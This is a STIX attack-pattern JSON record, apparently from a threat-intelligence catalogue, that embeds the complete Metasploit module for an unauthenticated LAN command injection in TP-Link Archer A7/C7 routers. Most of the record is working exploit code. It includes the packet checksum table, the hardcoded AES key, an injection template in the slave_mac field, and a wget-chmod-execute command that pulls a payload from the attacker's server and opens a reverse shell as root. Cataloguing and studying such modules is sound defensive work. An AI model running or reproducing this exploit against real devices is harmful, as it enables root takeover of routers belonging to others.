{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--b1f67c10-1197-46e7-9f07-f7314afb03c5",
    "created": "2024-08-14T16:57:19.621658Z",
    "modified": "2024-08-14T16:57:19.621662Z",
    "name": "TP-Link Archer A7/C7 Unauthenticated LAN Remote Code Execution",
    "description": " This module exploits a command injection vulnerability in the tdpServer daemon (/usr/bin/tdpServer), running on the router TP-Link Archer A7/C7 (AC1750), hardware version 5, MIPS Architecture, firmware version 190726. The vulnerability can only be exploited by an attacker on the LAN side of the router, but the attacker does not need any authentication to abuse it. After exploitation, an attacker will be able to execute any command as root, including downloading and executing a binary from another host. This vulnerability was discovered and exploited at Pwn2Own Tokyo 2019 by the Flashback team (Pedro Ribeiro + Radek Domanski). This module was updated in November 2020, after a bypass was discovered for the patch TP-Link issued. The new injection technique works on older firmware too. All firmware versions up to (but excluding) releases 201029 and 201030 are exploitable.  'License' => MSF_LICENSE",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/exploits/linux/misc/tplink_archer_a7_c7_lan_rce.rb",
            "external_id": "tplink_archer_a7_c7_lan_rce.rb"
        },
        {
            "source_name": "reference",
            "url": "https://www.thezdi.com/blog/2020/4/6/exploiting-the-tp-link-archer-c7-at-pwn2own-tokyo"
        },
        {
            "source_name": "reference",
            "url": "https://github.com/pedrib/PoC/blob/master/advisories/Pwn2Own/Tokyo_2019/lao_bomb/lao_bomb.md"
        },
        {
            "source_name": "reference",
            "url": "https://github.com/rdomanski/Exploits_and_Advisories/blob/master/advisories/Pwn2Own/Tokyo2019/lao_bomb.md"
        },
        {
            "source_name": "reference",
            "url": "https://github.com/pedrib/PoC/blob/master/advisories/Pwn2Own/Tokyo_2020/minesweeper.md"
        },
        {
            "source_name": "reference",
            "url": "https://github.com/rdomanski/Exploits_and_Advisories/blob/master/advisories/Pwn2Own/Tokyo2020/minesweeper.md"
        },
        {
            "source_name": "CVE",
            "external_id": "2020-10882"
        },
        {
            "source_name": "CVE",
            "external_id": "2020-10883"
        },
        {
            "source_name": "CVE",
            "external_id": "2020-10884"
        },
        {
            "source_name": "CVE",
            "external_id": "2020-28347"
        }
    ],
    "x_code_snippet": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\nrequire 'openssl'\n\nclass MetasploitModule < Msf::Exploit::Remote\n  Rank = ExcellentRanking\n\n  include Msf::Exploit::EXE\n  include Msf::Exploit::Remote::Udp\n  include Msf::Exploit::Remote::HttpServer\n  include Msf::Exploit::Remote::HttpClient\n\n  def initialize(info = {})\n    super(\n      update_info(\n        info,\n        'Name' => 'TP-Link Archer A7/C7 Unauthenticated LAN Remote Code Execution',\n        'Description' => %q{\n          This module exploits a command injection vulnerability in the tdpServer daemon (/usr/bin/tdpServer), running on\n          the router TP-Link Archer A7/C7 (AC1750), hardware version 5, MIPS Architecture, firmware version 190726.\n          The vulnerability can only be exploited by an attacker on the LAN side of the router, but the attacker does\n          not need any authentication to abuse it. After exploitation, an attacker will be able to execute any command\n          as root, including downloading and executing a binary from another host.\n          This vulnerability was discovered and exploited at Pwn2Own Tokyo 2019 by the Flashback team (Pedro Ribeiro +\n          Radek Domanski).\n          This module was updated in November 2020, after a bypass was discovered for the patch TP-Link issued. The new\n          injection technique works on older firmware too. All firmware versions up to (but excluding) releases 201029 and\n          201030 are exploitable.\n        },\n        'License' => MSF_LICENSE,\n        'Author' => [\n          'Pedro Ribeiro <pedrib[at]gmail.com>', # Vulnerability discovery and Metasploit module\n          'Radek Domanski <radek.domanski[at]gmail.com> @RabbitPro' # Vulnerability discovery and Metasploit module\n        ],\n        'References' => [\n          [ 'URL', 'https://www.thezdi.com/blog/2020/4/6/exploiting-the-tp-link-archer-c7-at-pwn2own-tokyo'],\n          [ 'URL', 'https://github.com/pedrib/PoC/blob/master/advisories/Pwn2Own/Tokyo_2019/lao_bomb/lao_bomb.md'],\n          [ 'URL', 'https://github.com/rdomanski/Exploits_and_Advisories/blob/master/advisories/Pwn2Own/Tokyo2019/lao_bomb.md'],\n          [ 'URL', 'https://github.com/pedrib/PoC/blob/master/advisories/Pwn2Own/Tokyo_2020/minesweeper.md'],\n          [ 'URL', 'https://github.com/rdomanski/Exploits_and_Advisories/blob/master/advisories/Pwn2Own/Tokyo2020/minesweeper.md'],\n          [ 'CVE', '2020-10882'],\n          [ 'CVE', '2020-10883'],\n          [ 'CVE', '2020-10884'],\n          [ 'CVE', '2020-28347'],\n          [ 'ZDI', '20-334'],\n          [ 'ZDI', '20-335'],\n          [ 'ZDI', '20-336' ]\n        ],\n        'Privileged' => true,\n        'Platform' => 'linux',\n        'Arch' => ARCH_MIPSBE,\n        'Payload' => {},\n        'Stance' => Msf::Exploit::Stance::Aggressive,\n        'DefaultOptions' => {\n          'PAYLOAD' => 'linux/mipsbe/shell_reverse_tcp',\n          'WfsDelay' => 15\n        },\n        'Targets' => [\n          [ 'TP-Link Archer A7/C7 (AC1750) v5 (firmware up to 201029/30)', {} ]\n        ],\n        'DisclosureDate' => '2020-03-25',\n        'DefaultTarget' => 0,\n        'Notes' => {\n          'Stability' => [ CRASH_SAFE ],\n          'Reliability' => [ REPEATABLE_SESSION ],\n          'SideEffects' => [ ARTIFACTS_ON_DISK, IOC_IN_LOGS ]\n        }\n      )\n    )\n    register_options(\n      [\n        Opt::RPORT(20002)\n      ]\n    )\n\n    register_advanced_options(\n      [\n        OptInt.new('MAX_WAIT', [true, 'Number of seconds to wait for payload download', 15])\n      ]\n    )\n  end\n\n  def check\n    vuln_versions = [\n      # older versions not listed here are also vulnerable\n      'app.1575358240615.manifest',   # A7 191203\n      'app.1582117229115.manifest',   # A7 200220\n      'app.1595301495454.manifest',   # A7 200721\n      'app.1564127413977.manifest',   # C7 190726\n      'app.1593336984117.manifest',   # C7 201030\n    ]\n\n    fixed_versions = [\n      'app.1603185012713.manifest',   # A7 201029\n      'app.1603240096315.manifest'    # C7 201030\n    ]\n\n    begin\n      for version in vuln_versions\n        res = send_request_cgi({\n          'uri' => \"/webpages/#{version}\",\n          'method' => 'GET',\n          'rport' => 80\n        })\n        if res && res.code == 200\n          return Exploit::CheckCode::Vulnerable\n        end\n      end\n\n      for version in fixed_versions\n        res = send_request_cgi({\n          'uri' => \"/webpages/#{version}\",\n          'method' => 'GET',\n          'rport' => 80\n        })\n        if res && res.code == 200\n          return Exploit::CheckCode::Safe\n        end\n      end\n    rescue ::Rex::ConnectionError\n      pass\n    end\n    return Exploit::CheckCode::Unknown\n  end\n\n  def calc_checksum(packet)\n    # reference table used to calculate the packet checksum\n    # used by tdpd_pkt_calc_checksum (0x4037f0)\n    # located at offset 0x0416e90 in the binary\n    reference_tbl = [\n      0x00, 0x00, 0x00, 0x00, 0x77, 0x07, 0x30, 0x96, 0xee,\n      0x0e, 0x61, 0x2c, 0x99, 0x09, 0x51, 0xba, 0x07, 0x6d, 0xc4, 0x19, 0x70, 0x6a, 0xf4,\n      0x8f, 0xe9, 0x63, 0xa5, 0x35, 0x9e, 0x64, 0x95, 0xa3, 0x0e, 0xdb, 0x88, 0x32, 0x79,\n      0xdc, 0xb8, 0xa4, 0xe0, 0xd5, 0xe9, 0x1e, 0x97, 0xd2, 0xd9, 0x88, 0x09, 0xb6, 0x4c,\n      0x2b, 0x7e, 0xb1, 0x7c, 0xbd, 0xe7, 0xb8, 0x2d, 0x07, 0x90, 0xbf, 0x1d, 0x91, 0x1d,\n      0xb7, 0x10, 0x64, 0x6a, 0xb0, 0x20, 0xf2, 0xf3, 0xb9, 0x71, 0x48, 0x84, 0xbe, 0x41,\n      0xde, 0x1a, 0xda, 0xd4, 0x7d, 0x6d, 0xdd, 0xe4, 0xeb, 0xf4, 0xd4, 0xb5, 0x51, 0x83,\n      0xd3, 0x85, 0xc7, 0x13, 0x6c, 0x98, 0x56, 0x64, 0x6b, 0xa8, 0xc0, 0xfd, 0x62, 0xf9,\n      0x7a, 0x8a, 0x65, 0xc9, 0xec, 0x14, 0x01, 0x5c, 0x4f, 0x63, 0x06, 0x6c, 0xd9, 0xfa,\n      0x0f, 0x3d, 0x63, 0x8d, 0x08, 0x0d, 0xf5, 0x3b, 0x6e, 0x20, 0xc8, 0x4c, 0x69, 0x10,\n      0x5e, 0xd5, 0x60, 0x41, 0xe4, 0xa2, 0x67, 0x71, 0x72, 0x3c, 0x03, 0xe4, 0xd1, 0x4b,\n      0x04, 0xd4, 0x47, 0xd2, 0x0d, 0x85, 0xfd, 0xa5, 0x0a, 0xb5, 0x6b, 0x35, 0xb5, 0xa8,\n      0xfa, 0x42, 0xb2, 0x98, 0x6c, 0xdb, 0xbb, 0xc9, 0xd6, 0xac, 0xbc, 0xf9, 0x40, 0x32,\n      0xd8, 0x6c, 0xe3, 0x45, 0xdf, 0x5c, 0x75, 0xdc, 0xd6, 0x0d, 0xcf, 0xab, 0xd1, 0x3d,\n      0x59, 0x26, 0xd9, 0x30, 0xac, 0x51, 0xde, 0x00, 0x3a, 0xc8, 0xd7, 0x51, 0x80, 0xbf,\n      0xd0, 0x61, 0x16, 0x21, 0xb4, 0xf4, 0xb5, 0x56, 0xb3, 0xc4, 0x23, 0xcf, 0xba, 0x95,\n      0x99, 0xb8, 0xbd, 0xa5, 0x0f, 0x28, 0x02, 0xb8, 0x9e, 0x5f, 0x05, 0x88, 0x08, 0xc6,\n      0x0c, 0xd9, 0xb2, 0xb1, 0x0b, 0xe9, 0x24, 0x2f, 0x6f, 0x7c, 0x87, 0x58, 0x68, 0x4c,\n      0x11, 0xc1, 0x61, 0x1d, 0xab, 0xb6, 0x66, 0x2d, 0x3d, 0x76, 0xdc, 0x41, 0x90, 0x01,\n      0xdb, 0x71, 0x06, 0x98, 0xd2, 0x20, 0xbc, 0xef, 0xd5, 0x10, 0x2a, 0x71, 0xb1, 0x85,\n      0x89, 0x06, 0xb6, 0xb5, 0x1f, 0x9f, 0xbf, 0xe4, 0xa5, 0xe8, 0xb8, 0xd4, 0x33, 0x78,\n      0x07, 0xc9, 0xa2, 0x0f, 0x00, 0xf9, 0x34, 0x96, 0x09, 0xa8, 0x8e, 0xe1, 0x0e, 0x98,\n      0x18, 0x7f, 0x6a, 0x0d, 0xbb, 0x08, 0x6d, 0x3d, 0x2d, 0x91, 0x64, 0x6c, 0x97, 0xe6,\n      0x63, 0x5c, 0x01, 0x6b, 0x6b, 0x51, 0xf4, 0x1c, 0x6c, 0x61, 0x62, 0x85, 0x65, 0x30,\n      0xd8, 0xf2, 0x62, 0x00, 0x4e, 0x6c, 0x06, 0x95, 0xed, 0x1b, 0x01, 0xa5, 0x7b, 0x82,\n      0x08, 0xf4, 0xc1, 0xf5, 0x0f, 0xc4, 0x57, 0x65, 0xb0, 0xd9, 0xc6, 0x12, 0xb7, 0xe9,\n      0x50, 0x8b, 0xbe, 0xb8, 0xea, 0xfc, 0xb9, 0x88, 0x7c, 0x62, 0xdd, 0x1d, 0xdf, 0x15,\n      0xda, 0x2d, 0x49, 0x8c, 0xd3, 0x7c, 0xf3, 0xfb, 0xd4, 0x4c, 0x65, 0x4d, 0xb2, 0x61,\n      0x58, 0x3a, 0xb5, 0x51, 0xce, 0xa3, 0xbc, 0x00, 0x74, 0xd4, 0xbb, 0x30, 0xe2, 0x4a,\n      0xdf, 0xa5, 0x41, 0x3d, 0xd8, 0x95, 0xd7, 0xa4, 0xd1, 0xc4, 0x6d, 0xd3, 0xd6, 0xf4,\n      0xfb, 0x43, 0x69, 0xe9, 0x6a, 0x34, 0x6e, 0xd9, 0xfc, 0xad, 0x67, 0x88, 0x46, 0xda,\n      0x60, 0xb8, 0xd0, 0x44, 0x04, 0x2d, 0x73, 0x33, 0x03, 0x1d, 0xe5, 0xaa, 0x0a, 0x4c,\n      0x5f, 0xdd, 0x0d, 0x7c, 0xc9, 0x50, 0x05, 0x71, 0x3c, 0x27, 0x02, 0x41, 0xaa, 0xbe,\n      0x0b, 0x10, 0x10, 0xc9, 0x0c, 0x20, 0x86, 0x57, 0x68, 0xb5, 0x25, 0x20, 0x6f, 0x85,\n      0xb3, 0xb9, 0x66, 0xd4, 0x09, 0xce, 0x61, 0xe4, 0x9f, 0x5e, 0xde, 0xf9, 0x0e, 0x29,\n      0xd9, 0xc9, 0x98, 0xb0, 0xd0, 0x98, 0x22, 0xc7, 0xd7, 0xa8, 0xb4, 0x59, 0xb3, 0x3d,\n      0x17, 0x2e, 0xb4, 0x0d, 0x81, 0xb7, 0xbd, 0x5c, 0x3b, 0xc0, 0xba, 0x6c, 0xad, 0xed,\n      0xb8, 0x83, 0x20, 0x9a, 0xbf, 0xb3, 0xb6, 0x03, 0xb6, 0xe2, 0x0c, 0x74, 0xb1, 0xd2,\n      0x9a, 0xea, 0xd5, 0x47, 0x39, 0x9d, 0xd2, 0x77, 0xaf, 0x04, 0xdb, 0x26, 0x15, 0x73,\n      0xdc, 0x16, 0x83, 0xe3, 0x63, 0x0b, 0x12, 0x94, 0x64, 0x3b, 0x84, 0x0d, 0x6d, 0x6a,\n      0x3e, 0x7a, 0x6a, 0x5a, 0xa8, 0xe4, 0x0e, 0xcf, 0x0b, 0x93, 0x09, 0xff, 0x9d, 0x0a,\n      0x00, 0xae, 0x27, 0x7d, 0x07, 0x9e, 0xb1, 0xf0, 0x0f, 0x93, 0x44, 0x87, 0x08, 0xa3,\n      0xd2, 0x1e, 0x01, 0xf2, 0x68, 0x69, 0x06, 0xc2, 0xfe, 0xf7, 0x62, 0x57, 0x5d, 0x80,\n      0x65, 0x67, 0xcb, 0x19, 0x6c, 0x36, 0x71, 0x6e, 0x6b, 0x06, 0xe7, 0xfe, 0xd4, 0x1b,\n      0x76, 0x89, 0xd3, 0x2b, 0xe0, 0x10, 0xda, 0x7a, 0x5a, 0x67, 0xdd, 0x4a, 0xcc, 0xf9,\n      0xb9, 0xdf, 0x6f, 0x8e, 0xbe, 0xef, 0xf9, 0x17, 0xb7, 0xbe, 0x43, 0x60, 0xb0, 0x8e,\n      0xd5, 0xd6, 0xd6, 0xa3, 0xe8, 0xa1, 0xd1, 0x93, 0x7e, 0x38, 0xd8, 0xc2, 0xc4, 0x4f,\n      0xdf, 0xf2, 0x52, 0xd1, 0xbb, 0x67, 0xf1, 0xa6, 0xbc, 0x57, 0x67, 0x3f, 0xb5, 0x06,\n      0xdd, 0x48, 0xb2, 0x36, 0x4b, 0xd8, 0x0d, 0x2b, 0xda, 0xaf, 0x0a, 0x1b, 0x4c, 0x36,\n      0x03, 0x4a, 0xf6, 0x41, 0x04, 0x7a, 0x60, 0xdf, 0x60, 0xef, 0xc3, 0xa8, 0x67, 0xdf,\n      0x55, 0x31, 0x6e, 0x8e, 0xef, 0x46, 0x69, 0xbe, 0x79, 0xcb, 0x61, 0xb3, 0x8c, 0xbc,\n      0x66, 0x83, 0x1a, 0x25, 0x6f, 0xd2, 0xa0, 0x52, 0x68, 0xe2, 0x36, 0xcc, 0x0c, 0x77,\n      0x95, 0xbb, 0x0b, 0x47, 0x03, 0x22, 0x02, 0x16, 0xb9, 0x55, 0x05, 0x26, 0x2f, 0xc5,\n      0xba, 0x3b, 0xbe, 0xb2, 0xbd, 0x0b, 0x28, 0x2b, 0xb4, 0x5a, 0x92, 0x5c, 0xb3, 0x6a,\n      0x04, 0xc2, 0xd7, 0xff, 0xa7, 0xb5, 0xd0, 0xcf, 0x31, 0x2c, 0xd9, 0x9e, 0x8b, 0x5b,\n      0xde, 0xae, 0x1d, 0x9b, 0x64, 0xc2, 0xb0, 0xec, 0x63, 0xf2, 0x26, 0x75, 0x6a, 0xa3,\n      0x9c, 0x02, 0x6d, 0x93, 0x0a, 0x9c, 0x09, 0x06, 0xa9, 0xeb, 0x0e, 0x36, 0x3f, 0x72,\n      0x07, 0x67, 0x85, 0x05, 0x00, 0x57, 0x13, 0x95, 0xbf, 0x4a, 0x82, 0xe2, 0xb8, 0x7a,\n      0x14, 0x7b, 0xb1, 0x2b, 0xae, 0x0c, 0xb6, 0x1b, 0x38, 0x92, 0xd2, 0x8e, 0x9b, 0xe5,\n      0xd5, 0xbe, 0x0d, 0x7c, 0xdc, 0xef, 0xb7, 0x0b, 0xdb, 0xdf, 0x21, 0x86, 0xd3, 0xd2,\n      0xd4, 0xf1, 0xd4, 0xe2, 0x42, 0x68, 0xdd, 0xb3, 0xf8, 0x1f, 0xda, 0x83, 0x6e, 0x81,\n      0xbe, 0x16, 0xcd, 0xf6, 0xb9, 0x26, 0x5b, 0x6f, 0xb0, 0x77, 0xe1, 0x18, 0xb7, 0x47,\n      0x77, 0x88, 0x08, 0x5a, 0xe6, 0xff, 0x0f, 0x6a, 0x70, 0x66, 0x06, 0x3b, 0xca, 0x11,\n      0x01, 0x0b, 0x5c, 0x8f, 0x65, 0x9e, 0xff, 0xf8, 0x62, 0xae, 0x69, 0x61, 0x6b, 0xff,\n      0xd3, 0x16, 0x6c, 0xcf, 0x45, 0xa0, 0x0a, 0xe2, 0x78, 0xd7, 0x0d, 0xd2, 0xee, 0x4e,\n      0x04, 0x83, 0x54, 0x39, 0x03, 0xb3, 0xc2, 0xa7, 0x67, 0x26, 0x61, 0xd0, 0x60, 0x16,\n      0xf7, 0x49, 0x69, 0x47, 0x4d, 0x3e, 0x6e, 0x77, 0xdb, 0xae, 0xd1, 0x6a, 0x4a, 0xd9,\n      0xd6, 0x5a, 0xdc, 0x40, 0xdf, 0x0b, 0x66, 0x37, 0xd8, 0x3b, 0xf0, 0xa9, 0xbc, 0xae,\n      0x53, 0xde, 0xbb, 0x9e, 0xc5, 0x47, 0xb2, 0xcf, 0x7f, 0x30, 0xb5, 0xff, 0xe9, 0xbd,\n      0xbd, 0xf2, 0x1c, 0xca, 0xba, 0xc2, 0x8a, 0x53, 0xb3, 0x93, 0x30, 0x24, 0xb4, 0xa3,\n      0xa6, 0xba, 0xd0, 0x36, 0x05, 0xcd, 0xd7, 0x06, 0x93, 0x54, 0xde, 0x57, 0x29, 0x23,\n      0xd9, 0x67, 0xbf, 0xb3, 0x66, 0x7a, 0x2e, 0xc4, 0x61, 0x4a, 0xb8, 0x5d, 0x68, 0x1b,\n      0x02, 0x2a, 0x6f, 0x2b, 0x94, 0xb4, 0x0b, 0xbe, 0x37, 0xc3, 0x0c, 0x8e, 0xa1, 0x5a,\n      0x05, 0xdf, 0x1b, 0x2d, 0x02, 0xef, 0x8d\n    ]\n\n    res = 0xffffffff\n\n    # main checksum calculation\n    packet.each_entry do |c|\n      index = ((c ^ res) & 0xff) * 4\n      # .reverse is needed as the target is big endian\n      ref = reference_tbl[index..index + 3].reverse.pack('C*').unpack1('L')\n      res = ref ^ (res >> 8)\n    end\n\n    checksum = ~res\n    checksum_s = [checksum].pack('I>').force_encoding('ascii')\n\n    # convert back to string\n    packet = packet.pack('C*').force_encoding('ascii')\n\n    # and replace the checksum\n    packet[12] = checksum_s[0]\n    packet[13] = checksum_s[1]\n    packet[14] = checksum_s[2]\n    packet[15] = checksum_s[3]\n\n    packet\n  end\n\n  def aes_encrypt(plaintext)\n    # Function encrypts perfectly 16 bytes aligned payload\n\n    if (plaintext.length % 16 != 0)\n      return\n    end\n\n    cipher = OpenSSL::Cipher.new 'AES-128-CBC'\n    # in the original C code the key and IV are 256 bits long... but they still use AES-128\n    iv = '1234567890abcdef'\n    key = 'TPONEMESH_Kf!xn?'\n    encrypted = ''\n    cipher.encrypt\n    cipher.iv = iv\n    cipher.key = key\n\n    # Take each 16 bytes block and encrypt it\n    plaintext.scan(/.{1,16}/) do |block|\n      encrypted += cipher.update(block)\n    end\n\n    encrypted\n  end\n\n  # rubocop:disable Naming/MethodParameterName, Style/FormatStringToken\n  def create_injection(c, literal: false)\n    # Template for the command injection\n    # The injection happens at \"slave_mac\" (read advisory for details)\n    # The payload will have to be padded to exactly 16 bytes to ensure reliability between different OpenSSL versions.\n\n    # This will fail if we send a command with single quotes (')\n    # ... but that's not a problem for this module, since we don't use them for our command.\n    # It might also fail with double quotes (\") since this will break the JSON...\n    if literal\n      inject = c\n    else\n      inject = \"\\'`printf \\'#{c}\\'>>#{@cmd_file}`\\'\"\n    end\n\n    template = '{\"method\":\"slave_key_offer\",\"data\":{'\\\n    \"\\\"group_id\\\":\\\"#{rand_text_numeric(1..3)}\\\",\"\\\n    \"\\\"ip\\\":\\\"#{rand_text_numeric(1..3)}.#{rand_text_numeric(1..3)}.#{rand_text_numeric(1..3)}.#{rand_text_numeric(1..3)}\\\",\"\\\n    '\"slave_mac\":\"%{INJECTION}\",'\\\n    \"\\\"slave_private_account\\\":\\\"#{rand_text_alpha(5..13)}\\\",\"\\\n    \"\\\"slave_private_password\\\":\\\"#{rand_text_alpha(5..13)}\\\",\"\\\n    '\"want_to_join\":false,'\\\n    \"\\\"model\\\":\\\"#{rand_text_alpha(5..13)}\\\",\"\\\n    \"\\\"product_type\\\":\\\"#{rand_text_alpha(5..13)}\\\",\"\\\n    '\"operation_mode\":\"A%{PADDING}\"}}'\n\n    # This is required to calculate exact template length without replace flags\n    template_len = template.length - '%{INJECTION}'.length - '%{PADDING}'.length\n    # This has to be initialized to cover the situation when no padding is needed\n    pad = ''\n    padding = rand_text_alpha(16)\n\n    template_len += inject.length\n\n    # Calculate pad if padding is needed\n    if (template_len % 16 != 0)\n      pad = padding[0..15 - (template_len % 16)]\n    end\n\n    # Here the final payload is created\n    format(template, INJECTION: inject.to_s, PADDING: pad.to_s)\n  end\n  # rubocop:enable Naming/MethodParameterName, Style/FormatStringToken\n\n  def update_len_field(packet, payload_length)\n    new_packet = packet[0..3]\n    new_packet += [payload_length].pack('S>')\n    new_packet += packet[6..]\n    new_packet\n  end\n\n  def exec_cmd_file(packet)\n    # This function handles special action of exec\n    # Returns new complete tpdp packet\n    inject = \"\\'`sh #{@cmd_file}`\\'\"\n    payload = create_injection(inject, literal: true)\n\n    ciphertext = aes_encrypt(payload)\n    if !ciphertext\n      fail_with(Failure::Unknown, \"#{peer} - Failed to encrypt packet!\")\n    end\n\n    new_packet = packet[0..15]\n    new_packet += ciphertext\n    new_packet = update_len_field(new_packet, ciphertext.length)\n\n    calc_checksum(new_packet.bytes)\n  end\n\n  # Handle incoming requests from the router\n  def on_request_uri(cli, _request)\n    if !@payload_sent\n      print_good(\"#{peer} - Sending executable to the router\")\n      print_good(\"#{peer} - Sit back and relax, Shelly will come visit soon!\")\n      send_response(cli, @payload_exe)\n      @payload_sent = true\n    end\n  end\n\n  def exploit\n    if ((datastore['SRVHOST'] == '0.0.0.0') || (datastore['SRVHOST'] == '::'))\n      fail_with(Failure::Unreachable, \"#{peer} - Please specify the LAN IP address of this computer in SRVHOST\")\n    end\n\n    if datastore['SSL']\n      fail_with(Failure::Unknown, 'SSL is not supported on this target, please disable it')\n    end\n\n    print_status(\"Attempting to exploit #{target.name}\")\n\n    tpdp_packet_template =\n      [0x01].pack('C*') + # packet version, fixed to 1\n      [0xf0].pack('C*') + # set packet type to 0xf0 (onemesh)\n      [0x07].pack('S>*') + # onemesh opcode, used by the onemesh_main switch table\n      [0x00].pack('S>*') + # packet len\n      [0x01].pack('C*') + # some flag, has to be 1 to enter the vulnerable onemesh function\n      [0x00].pack('C*') + # dunno what this is\n      [rand(0xff), rand(0xff), rand(0xff), rand(0xff)].pack('C*') + # serial number, can by any value\n      [0x5A, 0x6B, 0x7C, 0x8D].pack('C*') # Checksum placeholder\n\n    srv_host = datastore['SRVHOST']\n    srv_port = datastore['SRVPORT']\n    @cmd_file = rand_text_alpha_lower(1)\n    payload_file = rand_text_alpha_lower(1)\n\n    # generate our payload executable\n    @payload_exe = generate_payload_exe\n\n    # Command that will download @payload_exe and execute it\n    download_cmd = \"wget http://#{srv_host}:#{srv_port}/#{payload_file};chmod +x #{payload_file};./#{payload_file}\"\n\n    http_service = \"http://#{srv_host}:#{srv_port}\"\n    print_status(\"Starting up our web service on #{http_service} ...\")\n    start_service({\n      'Uri' => {\n        'Proc' => proc do |cli, req|\n          on_request_uri(cli, req)\n        end,\n        'Path' => \"/#{payload_file}\"\n      }\n    })\n\n    print_status(\"#{peer} - Connecting to the target\")\n    connect_udp\n\n    print_status(\"#{peer} - Sending command file byte by byte\")\n    print_status(\"#{peer} - Command: #{download_cmd}\")\n    mod = download_cmd.length / 5\n\n    download_cmd.each_char.with_index do |c, index|\n      # Generate payload\n      payload = create_injection(c)\n      if !payload\n        fail_with(Failure::Unknown, \"#{peer} - Failed to setup download command!\")\n      end\n\n      # Encrypt payload\n      ciphertext = aes_encrypt(payload)\n      if !ciphertext\n        fail_with(Failure::Unknown, \"#{peer} - Failed to encrypt packet!\")\n      end\n\n      tpdp_packet = tpdp_packet_template.dup\n      tpdp_packet += ciphertext\n      tpdp_packet = update_len_field(tpdp_packet, ciphertext.length)\n      tpdp_packet = calc_checksum(tpdp_packet.bytes)\n\n      udp_sock.put(tpdp_packet)\n\n      # Sleep to make sure the payload is processed by a target\n      Rex.sleep(1)\n\n      # Print progress\n      if ((index + 1) % mod == 0)\n        percentage = 20 * ((index + 1) / mod)\n        # very advanced mathemathics in use here to show the progress bar\n        print_status(\"#{peer} - [0%]=#{' =' * ((percentage * 2 / 10 - 1) - 1)}>#{' -' * (20 - (percentage * 2 / 10))}[100%]\")\n        if percentage == 100\n          # a bit of cheating to get the last char done right\n          # rubocop:disable Lint/UselessAssignment\n          index = -2\n          # rubocop:enable Lint/UselessAssignment\n        end\n        # print_status(\"#{peer} - #{download_cmd[0..index+1]}#{'-' * (download_cmd[index+1..-1].length-1)}\")\n      end\n    end\n\n    # Send the exec command. From here we should receive the connection\n    print_status(\"#{peer} - Command file sent, attempting to execute...\")\n    tpdp_packet = exec_cmd_file(tpdp_packet_template.dup)\n    udp_sock.put(tpdp_packet)\n\n    timeout = 0\n    until @payload_sent\n      Rex.sleep(1)\n      timeout += 1\n      if timeout == datastore['MAX_WAIT'].to_i\n        fail_with(Failure::Unknown, \"#{peer} - Timeout reached! Payload was not downloaded :(\")\n      end\n    end\n\n    disconnect_udp\n  end\nend\n",
    "x_mitre_disclosure_date": "2020-03-25",
    "x_mitre_platforms": [
        "linux'"
    ]
}